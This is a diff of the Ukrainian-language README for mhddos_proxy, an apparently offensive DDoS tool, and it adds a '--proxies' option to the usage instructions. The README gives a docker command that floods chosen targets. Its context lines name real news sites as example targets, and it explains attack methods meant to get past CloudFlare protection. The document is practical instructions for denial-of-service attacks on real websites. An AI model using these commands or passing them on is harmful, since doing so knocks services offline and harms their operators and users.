@@ -112,7 +112,7 @@ python3 runner.py https://ria.ru https://tass.ru
 Взагалі, загальний вигляд команди виглядає так:
 
 ```sh
-sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy <list of targets> -c <config_file> <--itarmy> -t <threads> -p <period> <--debug> <--table> <--vpn> --rpc <n_requests> --proxy-timeout <proxy_timeout>  --http-methods <list of http_methods>
+sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy <list of targets> -c <config_file> <--itarmy> -t <threads> -p <period> <--debug> <--table> <--vpn> --rpc <n_requests> --proxy-timeout <proxy_timeout> --proxies <proxies.txt>  --http-methods <list of http_methods>
 ```
 
 Одразу ж прошу Вас звернути увагу на параметр -t й експериментально встановити значення для нього для конкретно Вашої машини й Вашого інтернету.
@@ -128,7 +128,8 @@ sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_p
 * `<--table>` - чи виводити логи у вигляді таблички
 * `<--vpn>` - прапорець, чи використовувати VPN, чи ні. Якщо цей параметр присутній, то використовувати VPN, якщо ні, то будуть використовуватися проксі. У більшості випадків використовуйте проксі, бо саме в них сила цього скрипту
 * `--rpc <n_requests>` - скільки запитів відправляти, враховуючи одне проксі. За замовчуванням 2000. Впринципі, це значення є оптимальним. Якщо хочете, можете його змінювати
-* `--proxy-timeout <proxy_timeout>` - скільки секунд чекати, щоб проксі встановило зв'язок. За замовчуванням 5 секунд
+* `--proxy-timeout <proxy_timeout>` - скільки секунд чекати, щоб проксі встановило зв'язок. За замовчуванням 5 секундґ
+* `--proxies <proxies.txt>` - передати власні проксі. Потрібно покласти файл із проксі поряд із runner.py і вказати замість proxies.txt назву свого файлу із проксі
 * `--http-methods <list of http_methods>` - список методів для атаки для HTTP адрес. **Для TCP та UDP адрес передавати не потрібно!** За замовчуванням це метод GET + рандомний серед методів POST та STRESS. Доцільно використовувати, коли для сайту, який ми атакуємо відомий його захист, тоді можна передавати CFB для проходження захисту CloudFlare або CFBUAM для проходження захисту CloudFlare Under Attack Mode. Детальніше про всі методи можна [переглянути тут](https://github.com/MHProDev/MHDDoS#features-and-methods). Якщо ж захист нам невідомий, то доцільно залишити цей параметр дефолтним
 
 І окремо наводжу документацію. [Посилання на неї](https://github.com/porthole-ascend-cinnamon/mhddos_proxy#%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%B0%D1%86%D1%96%D1%8F)
@@ -140,7 +141,9 @@ usage: runner.py target [target ...]
                  [-c URL]
                  [--table]
                  [--debug]
+                 [--vpn]
                  [--rpc RPC] 
+                 [--proxy-timeout TIMEOUT]
                  [--http-methods METHOD [METHOD ...]]
 
 positional arguments:
@@ -148,7 +151,7 @@ positional arguments:
 
 optional arguments:
   -h, --help             show this help message and exit
-  -c, --config URL|path  URL to remote or path to local config file (list of targets in plain text)
+  -c, --config URL|path  URL or local path to file with attack targets
   -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
   -p, --period 900       How often to update the proxies (default is 900)
   --table                Print log as table
@@ -156,6 +159,7 @@ optional arguments:
   --vpn                  Disable proxies to use VPN
   --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
   --proxy-timeout 5      How many seconds to wait for the proxy to make a connection (default is 5)
+  --proxies URL|path     URL or local path to file with proxies to use
   --http-methods GET     List of HTTP(s) attack methods to use.
                          (default is GET, POST, STRESS, BOT, PPS)
                          Refer to MHDDoS docs for available options
